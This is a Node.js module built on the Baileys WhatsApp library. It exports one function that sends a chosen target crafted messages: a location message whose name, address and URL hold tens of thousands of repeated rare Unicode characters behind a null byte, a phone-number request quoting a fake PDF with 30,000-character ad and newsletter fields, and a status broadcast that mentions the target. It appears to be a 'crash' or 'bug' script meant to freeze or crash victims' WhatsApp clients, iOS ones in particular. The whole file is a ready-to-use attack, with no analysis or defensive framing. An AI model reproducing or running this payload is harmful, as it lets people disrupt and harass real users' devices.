const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// IOS FUNCTION 

async function SIOSX(LordBroken, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.666,
            degreesLongtitude: 66.666,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
    }, {});

   await LordBroken.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "xcrsd.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "{what is love?}",
          title: "@silentscar",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "can I be the one for you?",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/silentscar",
         mediaUrl: "https://t.me/silentscar",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        },
      },
     skipType: 7,
    }
  }, {
   participant: { jid: target }
 });

  await LordBroken.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}

module.exports = { SIOSX };
